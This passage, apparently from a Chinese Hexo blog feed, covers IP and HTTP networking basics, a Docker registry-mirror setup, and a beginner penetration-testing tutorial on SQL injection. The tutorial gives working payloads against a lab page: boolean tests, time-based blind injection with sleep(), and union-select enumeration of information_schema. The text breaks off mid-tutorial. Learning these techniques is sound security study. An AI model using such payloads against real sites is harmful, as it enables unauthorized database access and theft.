协议还有另一个重要的能力就是<strong>路由</strong>。实际场景中，两台设备并不是用一条网线连接起来的，而是通过很多网关、路由器、交换机等众多网络设备连接起来的，那么就会形成很多条网<br>络的路径，因此当数据包到达一个网络节点，就需要通过算法决定下一步走哪条路径。</p><p>IP 协议的寻址作用是告诉我们去往下一个目的地该朝哪个方向走，路由则是根据「下一个目的地」选择路径。寻址更像在导航，路由更像在操作方向盘</p></li></ol><h4 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h4><ol><li>一旦数据需要跨网络传输，就需要有一个设备同时在两个网络当中，这个设备一般是路由器，路由器<br>可以通过路由表计算出下一个要去的 IP 地址。</li><li>每一台设备的网卡都会有一个 MAC 地址，它就是用来唯一标识设备的。路由器计算出了下一个目的地<br>IP 地址，再通过 ARP 协议找到该目的地的 MAC 地址，这样就知道这个 IP 地址是哪个设备的了。</li></ol><h4 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h4><ol><li>主要他提供二进制的传输协议服务</li></ol><h2 id="IP详解"><a href="#IP详解" class="headerlink" title="IP详解"></a>IP详解</h2><h3 id="IP基础知识"><a href="#IP基础知识" class="headerlink" title="IP基础知识"></a>IP基础知识</h3><ol><li><p>IP的作用</p><p>TCP&#x2F;IP处于第三层网络层</p><p>网络层的作用：实现主机与主机之间的通信，也叫点对点通信</p></li><li><p>IP和MAC的关系</p><p>MAC负责实现<strong>直连</strong>的两个设备之间的通信，而IP负责<strong>没有直连</strong>的两个网络中</p><p>在网络中数据包传输中，源IP地址和目标IP地址在传输过程中是<strong>不会变化</strong>的，只有源 MAC 地址和目标 MAC <strong>一直在变化</strong>。</p></li></ol><h3 id="IP地址基础知识"><a href="#IP地址基础知识" class="headerlink" title="IP地址基础知识"></a>IP地址基础知识</h3><ol><li><p><code>IPV4</code>是由32为01组成的4组01，也就是说每一各组就是8位</p></li><li><p>IP地址的分类，分成了5类，A,B,C,D,E</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/image-20230819175436479.png" alt="image-20230819175436479"></p><p>只有A,B,C类才会分，网络号和主机号</p></li><li><p>判断分类</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/image-20230819175908124.png" alt="image-20230819175908124"></p></li><li><p>私有IP</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/image-20230819175936318.png" alt="image-20230819175936318"></p></li></ol><h3 id="IP协议相关技术"><a href="#IP协议相关技术" class="headerlink" title="IP协议相关技术"></a>IP协议相关技术</h3><p>跟 IP 协议相关的技术也不少，接下来说说与 IP 协议相关的重要且常见的技术。</p><ul><li>DNS 域名解析</li><li>ARP 与 RARP 协议 </li><li>DHCP 动态获取 IP 地址</li><li>NAT 网络地址转换</li><li>ICMP 互联网控制报文协议</li></ul><ol><li><p>DNS域名解析</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/image-20230819180737171.png" alt="image-20230819180737171"></p></li><li><p>DHCP 动态获取 IP 地址</p><p>工作流程</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/image-20230819180924981.png" alt="image-20230819180924981"></p></li></ol><h2 id="其他知识点"><a href="#其他知识点" class="headerlink" title="其他知识点"></a>其他知识点</h2><ol><li><p>url和uti</p><p>url的固定的语法</p><blockquote><p>protocol:&#x2F;&#x2F;[[user[:password]@]host[:port]][&#x2F;path][?query][#fragment]<br>[协议名]:&#x2F;&#x2F;用户名:密码@主机名:端口&#x2F;路径?查询参数#片段ID</p></blockquote><p>也就是说一个url常见的的组成是：</p><ul><li><p>协议名</p></li><li><p>域名</p></li><li><p>端口</p><p>https默认的端口是443</p><p>http默认的端口是80</p></li><li><p>&#x2F;后面表示的是路径</p></li><li><p>?后面表示的参数</p></li></ul><p>例如：</p><blockquote><p><a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol?id=123#HTTP/1.1_response_messages">https://en.wikipedia.org:443/wiki/Hypertext_Transfer_Protocol?id=123#HTTP/1.1_response_messages</a></p></blockquote></li><li><p>uri  统一资源标识符</p><p>下面是uri和url的关系</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/image-20230820104232492.png" alt="image-20230820104232492"></p></li><li><p>http客户端请求信息</p><p>http请求四个部分组成</p><ul><li>请求行</li><li>请求头部</li><li>空行</li><li>请求正文</li></ul></li><li><p>请求方法</p><p>就是在请求行一个部分的字符</p><p><strong>GET</strong> 请求获取Request-URI所标识的资源<br><strong>POST</strong> 在Request-URI所标识的资源后附加新的数据<br><strong>HEAD</strong> 请求获取由Request-URI所标识的资源的响应消息报头 </p><p><strong>PUT</strong> 请求服务器存储一个资源，并用Request-URI作为其标识 </p><p><strong>DELETE</strong> 请求服务器删除Request-URI所标识的资源<br><strong>TRACE</strong> 请求服务器回送收到的请求信息，主要用于测试或诊断<br><strong>OPTIONS</strong> 请求查询服务器的性能，或者查询与资源相关的选项和需求<br><strong>CONNECT</strong> 保留将来使用，HTTP&#x2F;1.1协议中预留给能够将连接改为管道方式的代理服务器<br><strong>PATCH</strong> 用于将局部修改应用到资源。（由  RFC 5789 指定的方法）</p><ul><li>get主要和post 的区别<ul><li>get负责字符传输，传参的时候是url里面传参数</li><li>post负责流媒体等超文本的传输，使用字节传输</li></ul></li></ul></li><li><p>五大http状态码</p><ul><li>100 继续</li><li>200 成功</li><li>302 跳转，重定向</li><li>404 访问资源不存在</li><li>403 访问不允许</li><li>405 请求方式不允许</li><li>5XX 服务器错误</li></ul></li></ol><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>HTTP 是超文本传输协议，也就是<strong>H</strong>yperText <strong>T</strong>ransfer <strong>P</strong>rotocol</p><h3 id="http常见的字段"><a href="#http常见的字段" class="headerlink" title="http常见的字段"></a>http常见的字段</h3><h4 id="host"><a href="#host" class="headerlink" title="host"></a>host</h4><p>客户端发送请求的时候，用来指定服务器的域名</p><blockquote><p>host: <a href="http://www.a.com/">www.a.com</a></p></blockquote><h4 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a><em>Content-Length</em></h4><p>表明本次回应的长度是多少</p><h4 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a><em>Connection</em></h4><p>是否是TCP持久通信</p><h4 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a><em>Content-Type</em></h4><p>高速客户端本次的数据是什么格式</p><h4 id="Content-Encoding"><a href="#Content-Encoding" class="headerlink" title="Content-Encoding"></a><em>Content-Encoding</em></h4><p>说明数据的压缩方法</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol><li><p><em>Content-Encoding</em> </p><p>通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态</p></li><li><p>post提交数据的几种Content-Type</p><ul><li>application&#x2F;x-www-form-urlencoded：最常见的POST提交数据方式，浏览器支持的原生form  表单</li><li>multipart&#x2F;form-data：这种方式一般用来上传文件</li><li>application&#x2F;json：在响应头中很常见，在请求头中用来告诉服务端消息主体是序列化后的json  字符串</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>阿里云docker加速</title>
    <link href="/2023/08/19/others/%E9%98%BF%E9%87%8C%E4%BA%91docker%E5%8A%A0%E9%80%9F/"/>
    <url>/2023/08/19/others/%E9%98%BF%E9%87%8C%E4%BA%91docker%E5%8A%A0%E9%80%9F/</url>
    
    <content type="html"><![CDATA[<p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">容器镜像服务 (aliyun.com)</a></p><blockquote><p>sudo mkdir -p &#x2F;etc&#x2F;docker </p><p>sudo tee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-‘EOF’</p><p> {</p><p>  “registry-mirrors”: [“<a href="https://apdrkepd.mirror.aliyuncs.com"]">https://apdrkepd.mirror.aliyuncs.com&quot;]</a> </p><p>}</p><p>EOF </p><p>sudo systemctl daemon-reload </p><p>sudo systemctl restart docker</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透基础</title>
    <link href="/2023/08/19/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/08/19/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="渗透基础"><a href="#渗透基础" class="headerlink" title="渗透基础"></a>渗透基础</h1><h2 id="web安全-基础环境搭建"><a href="#web安全-基础环境搭建" class="headerlink" title="web安全-基础环境搭建"></a>web安全-基础环境搭建</h2><h2 id="web安全-sql注入"><a href="#web安全-sql注入" class="headerlink" title="web安全-sql注入"></a>web安全-sql注入</h2><h3 id="sql简介"><a href="#sql简介" class="headerlink" title="sql简介"></a>sql简介</h3><ol><li><p>什么是sql</p><p>  SQL是一种数据库查询和程序设计语言。用于存取数据以及查询、更新和管理关系数据库系统。  </p><p>  常见的SQL数据库有MySQL，SQL server，Oracle、Sybase、db2….不同的数据库所使用的SQL语句也  </p><p>不一样。</p></li><li><p>mysql的数据结构</p><p>  数据库中包含表，表是由列组成，表的数据存储方式是按行存储。</p></li></ol><h3 id="mysql语句"><a href="#mysql语句" class="headerlink" title="mysql语句"></a>mysql语句</h3><ol><li><p>select</p><p>  用于从表中选取数据。结果被存储在一个结果表中（称为结果集）。  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 语法：<br>SELECT 列名 FROM 表名<br>SELECT * FROM 表名<br><br></code></pre></td></tr></table></figure></li><li><p>insert info</p><p>用于向表中插入新的<strong>行</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 语法：<br>INSERT INTO 表名称 VALUES (值1, 值2,....)<br>INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)<br><br></code></pre></td></tr></table></figure></li><li><p>delete </p><p>用于删除表中的行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 语法：<br>DELETE FROM 表名称 WHERE 列名称 = 值<br>DELETE * FROM 表名称<br><br></code></pre></td></tr></table></figure></li><li><p>updatte</p><p>用于修改表中的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 语法：<br>UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值<br><br></code></pre></td></tr></table></figure></li><li><p>oder by</p><p>用于对结果集进行排序。  </p><p>用于根据指定的列对结果集进行排序。  </p><p>默认按照升序对记录进行排序；  </p><p>按照降序对记录排序，使用DESC关键字；  </p><p>order by 排序列数大于当前查询的列数时就会报错； </p><p> sql注入利用这个特性来判断列数以及显示位。  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823152001672.png" alt="image-20230823152001672"></p></li><li><p>where</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 有条件地从表中选取数据<br># 语法：<br>SELECT 列名称 FROM 表名称 WHERE 列 运算符 值<br><br></code></pre></td></tr></table></figure></li><li><p>AND 和 OR运算符</p><p>AND 和 OR  可在 WHERE 子语句中把两个或多个条件结合起来。  </p><p>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。  </p><p>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823152402216.png" alt="image-20230823152402216"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823152421200.png" alt="image-20230823152421200"></p></li><li><p>注释符</p><ul><li><p>注释符可以替代空格</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823152602583.png" alt="image-20230823152602583"></p><p>有些时候可能对方不接受空格，所以使用注释符的形式</p></li><li><p>内联注入</p><blockquote><p>  &#x2F;<em>!&#x2F;</em>!*&#x2F;  </p><p>&#x2F;* *&#x2F; 在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行</p></blockquote></li></ul></li><li><p>连接</p><ul><li><p>数据库的连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 格式 mysql -u 用户名 -p 密码 -h 主机地址<br>mysql –uroot -proot -h 127.0.0.1<br><br></code></pre></td></tr></table></figure></li><li><p>列出当前的mysql的相关状态信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">status;<br></code></pre></td></tr></table></figure></li><li><p>显示所有的数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show databases;<br></code></pre></td></tr></table></figure></li><li><p>打开数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">use mysql<br></code></pre></td></tr></table></figure></li><li><p>显示数据表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show tables<br></code></pre></td></tr></table></figure></li><li><p>显示表结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 格式：describe 数据表名;<br>describe user;<br># 格式：show columns from 数据表名;<br>show columns from user;<br><br></code></pre></td></tr></table></figure></li><li><p>清空数据表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 格式：delete from 数据表名;<br>delete from test01;<br># 格式：truncate table 数据表名;<br>truncate table test01;<br><br></code></pre></td></tr></table></figure></li><li><p>显示表的创建过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 格式：show create table 表名;<br>show create table user;<br><br></code></pre></td></tr></table></figure></li><li><p>删除表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 格式：drop table 数据表;<br>drop table test01;<br><br></code></pre></td></tr></table></figure></li><li><p>退出数据库连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">exit<br></code></pre></td></tr></table></figure></li></ul></li><li><p>mysql的系统表</p><ul><li>information_schema</li></ul><p>  在 MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于  MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权  限等。  </p><ul><li><p><strong>SCHEMATA</strong> 表：提供了当前mysql实例中所有数据库的信息。  <strong>show</strong> databases*;* 的结果取之此表。  </p></li><li><p>TABLES 表：提供了关于数据库中的表的信息。详细表述了某个表属于哪个<strong>schema</strong>，表类型，表引擎，创建  时间等信息。  </p><p>  <strong>show</strong> tables from <strong>schemaname;</strong> (<strong>schemaname</strong>为指定数据库名**)**的结果取之此表。  </p></li><li><p>COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。  <strong>show</strong> columns from <strong>schemaname.tablename;</strong> (<strong>schemaname</strong>为指定数据库名**,** tablename为指定数据 库下的数据表名)的结果取之此表。</p></li></ul><p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823153825533.png" alt="image-20230823153825533"></p></li></ol><h3 id="mysql注入的原理"><a href="#mysql注入的原理" class="headerlink" title="mysql注入的原理"></a>mysql注入的原理</h3><ol><li><p>什么是sql注入</p><p> 利用现有应用程序，将恶意的SQL命令注入到程序后台并在数据库引擎执行的能力。  SQL注入漏洞是由于WEB应用程序对用户输入的数据合法性判断不严格导致。  </p><p>攻击者把SQL命令语句作为输入被服务器SQL解释器正确解析执行，数据库把查询到的结果返回给服  务器，然后呈现给攻击者，<strong>攻击者由此获得数据库内的数据信息</strong>。</p></li><li><p>一次正常的HTTP请求分析</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823165930344.png" alt="image-20230823165930344"></p></li><li><p>一次正常的sql注入分析</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823165956400.png" alt="image-20230823165956400"></p></li></ol><h3 id="sql注入判断"><a href="#sql注入判断" class="headerlink" title="sql注入判断"></a>sql注入判断</h3><p>  根据客户端返回的结果来判断提交的测试语句是否成功被数据库引擎执行，如果测试语句被执行了，  说明存在注入漏洞。  </p><p><strong>俗话就是说，只要我们可以进行sql语句那么就存在漏洞</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823170055778.png" alt="image-20230823170055778"></p><h3 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h3><ol><li><p>按参数类型的分类</p><ul><li><p>数字型（没有引号闭合）  </p></li><li><p>字符型（双引号）  </p></li><li><p>搜索型（使用百分号）</p></li></ul></li><li><p>按数据库返回的结果分类</p><ul><li><p>回显注入  </p></li><li><p>报错注入  </p></li><li><p>盲注  </p><ul><li>基于布尔的盲注  </li><li>基于时间的盲注</li></ul></li></ul></li><li><p>按注入点位置分类</p><ul><li><p>GET注入  </p></li><li><p>POST注入  </p></li><li><p>Cookie注入 </p></li><li><p>Header注入</p></li></ul></li><li><p>详解</p><ul><li><p>按参数类型分类</p><p>  参数类型主要有两种：数字型、字符型。  </p><p>  在SQL查询语句中，数据库查询类型有以下三种：数字型、字符型、搜索型。  </p><ul><li><p>数字型</p><blockquote><p>SQL&#x3D; “select name from users where id&#x3D;1” 为典型的数字型注入  </p></blockquote><p>这种类型的注入参数为数字，在 users 表中查询用户输入的 id 值相对应的 name 的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">and逻辑测试：<br>and 1=1 sql语句： select name from users where id=1 and 1=1<br>and 1=2 sql语句： select name from users where id=1 and 1=2<br>通过比较页面的变化判断输入是否被带入数据库执行<br><br></code></pre></td></tr></table></figure><p>有可能在执行1&#x3D;2的时候会报错，下面是具体的演示，请注意url的变化</p><p>当我输入</p><blockquote><p>?id&#x3D;1’ and 1&#x3D;2 –+</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823171333802.png" alt="image-20230823171333802"></p><p>当我输入</p><blockquote><p>?id&#x3D;1’ and 1&#x3D;1 –+</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823171534833.png" alt="image-20230823171534833"></p><p>会发现，网站执行了我们输入的 and ……这种附加的mysql语句，所以存在漏洞，当然不同的类型检查原理都一样，只是输入的参数不一样，我们这里输入的是<code>&#39;</code>,由此可见这是字符型</p></li><li><p>字符型</p><blockquote><p>SQL&#x3D;”select name from users where id&#x3D;’1’ “</p></blockquote><p>  字符型与数字型的不同：注入参数被引号包裹。  构造参数传递：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1 and 1=1<br>SQL语句： select name from users where id=&#x27;1 and 1=1&#x27;<br>1&#x27; and &#x27;1&#x27;=&#x27;1<br>SQL语句： select name from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27;<br>1&#x27; and 1=1 #<br>SQL语句： select name from users where id=&#x27;1&#x27; and 1=1 #&#x27;<br>1&#x27; and 1=2 #<br>SQL语句： select name from users where id=&#x27;1&#x27; and 1=2 #&#x27;<br><br></code></pre></td></tr></table></figure></li><li><p>搜索型 </p><blockquote><p>  SQL&#x3D; “select * from users  where name like ‘%tom%’ “  </p></blockquote><p>只是换了一个符号</p><p>搜索型与字符型相比多了一对 % </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1 and 1=1<br>SQL查询语句为：select * from users where id like &#x27;%1 and 1=1%&#x27;<br>这个输入显然会报错误。<br>1%&#x27;1 and &#x27;%1%&#x27;&#x27; = &#x27;%1<br>SQL查询语句：select * from users where name like &#x27;%tom%&#x27; and &#x27;%1%&#x27; = &#x27;%1%&#x27;<br>这里我们用 &#x27;% 来闭合 %&#x27; ，如果存在漏洞，返回正常信息。<br></code></pre></td></tr></table></figure><p>  注意： %  的URL编码为 %25 ，空格 “ “ 的URL编码为 %20，如果发现没有我们输入的 %  ，则我们可  以手工添加编码 %25。</p></li></ul></li><li><p>按数据库返回结果分类</p><ul><li><p>回显注入</p><p>在注入点的当前页面中获取返回结果。  </p><p>常用SQL注入测试代码：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1 or 1=1<br>1&#x27; or &#x27;1=1<br>1&#x27; or &#x27;1=2<br></code></pre></td></tr></table></figure><p>代码原理：利用逻辑运算符or 的运算原理，只要其中一个条件满足为真，则为真，而1&#x3D;1恒等式恒为  真，因此如果上面三个代码输入之后页面显示结果都为正常，则我们可以判断此页面存在SQL注入漏  洞  </p></li><li><p>报错注入</p><p>  程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以通过构  造一些报错语句从数据库返回并显示的错误信息中获取想要的结果。  </p><p>  在SQLServer中通常错误的查询会返回一些错误信息，在mysql中正常情况下是没有错误信息返回  </p><p>  的，但可以通过其他的方式进行错误信息的提取。  </p></li><li><p>盲注</p><p>  由于程序后端限制数据库返回错误信息，因此查询错误或没有结果时是没有信息返回的，可以通过数  据库的查询逻辑和延时函数来对注入的结果进行判断。  </p><p>  根据注入表现形式的不同，盲注又分为Based  boolean和Based time两种类型。  </p><p>Based boolean：基于布尔的盲注，其主要表现特征有：</p><ul><li><p>一是无报错信息返回；  </p></li><li><p>二是无论输入是正确还是错误，都只会显示两种情况（1 或 0）(ture 或 false)；  </p></li><li><p>三是在输入正确时，可通过输入 and 1&#x3D;1、and 1&#x3D;2 判断。  </p><p>Based time：基于Boolean的盲注可以在页面上看到正确或错误的回显，但是基于time的盲注是看不到  的。  </p><p>判断：通过”时间”条件进行特定的输入，判断后台执行SQL语句的时间来判断是否存在盲注。  比如 m’ and sleep(5) # 语句，通过页面显示的时间来判断是否存在基于时间的盲注。  可以通过在mysql语句中使用if构造查询语句。</p></li></ul><blockquote><p>  m’ <strong>and if</strong> ((substr((select database()),1,1))&#x3D;’a’,sleep(5),null) <strong>#</strong>  </p></blockquote><p>  通过substr对查询到的database()结果截取第一位的值，判断其否等于a，如果等于则判断为真，执行  sleep(5),如果不等于则判断为假，则null, 然后通过sleep(5)执行后的时间来确认所查询的值是否正确，  遍历出所有的值。</p></li></ul></li><li><p>按注入的位置分类  </p><p>  HTTP 定义了与服务器交互的不同方法，其中最基本的方法就是  GET 和  POST 。  <strong>GET</strong> 方式在客户端通过 URL 提交数据，数据在 URL 中可以看到；  </p><p><strong>POST</strong> 方式，数据放置在 Body 内提交，数据在 URL 中看不到。</p></li></ul></li></ol><h3 id="sql注入利用"><a href="#sql注入利用" class="headerlink" title="sql注入利用"></a>sql注入利用</h3><p>显错注入的流程</p><blockquote><p>01、获取字段数   <strong>order by</strong> x  </p><p>02、获取显示位  <strong>union select</strong> 1,2,3,4……  </p><p>03、获取数据库信息     version()，<strong>user</strong>()，@@datadir  </p><p>04、获取当前数据库    <strong>database</strong>()， <strong>schema</strong>()  </p><p>05、获取所有数据库  </p><p>06、获取数据库表  </p><p>07、获取所有字段  </p><p>08、获取数据  </p></blockquote><ul><li><p>判断是否存在sql的漏洞和存在什么形式的漏洞</p><blockquote><p>?id&#x3D;1’</p></blockquote><p>使用<code>&#39;</code>发现存在是字符型，接下来检查是否存在漏洞，使用and 1&#x3D;1</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823211411271.png" alt="image-20230823211411271"></p><p>上面是使用 and 1&#x3D;1 的结果，避免字符型的，只读前面造成的正确却访问接下来来看and 1&#x3D;2</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823211441010.png" alt="image-20230823211441010"></p><p>已经出现了错误，说明执行了我们插入了语句，存在漏洞</p></li><li><p>获取字段数</p><p>使用order by x进行判断当前的数据库有几行数据</p><p>建议这里可以使用脚本跑</p></li><li><p>获取显示位</p><p>由于我们传入的</p><blockquote><p>?id&#x3D;1</p></blockquote><p>会进行显示，所以我们让我们传入的id 不显示</p><blockquote><p>? id&#x3D;-1’ union select 1,2,3 –+</p></blockquote><p><code>--+</code>用于注释多出来的<code>&#39;</code></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823211947605.png" alt="image-20230823211947605"></p><p>可以发现2,3经行输出了，所以我们，针对2，3显示，显示我们想要查到的数据</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823212149811.png" alt="image-20230823212149811"></p><p>得到了数据库的拥有者，和当前的数据库版本</p></li><li><p>获取当前的数据库</p><blockquote><p>?id&#x3D;-1’ union select 1,database(),3–+</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823212646244.png" alt="image-20230823212646244"></p></li><li><p>查看所有的数据库</p><blockquote><p>?id&#x3D;-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata–+</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823213844804.png" alt="image-20230823213844804"></p></li><li><p>查找某一个表的信息</p><blockquote><p>?id&#x3D;-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() –+</p></blockquote><p><img 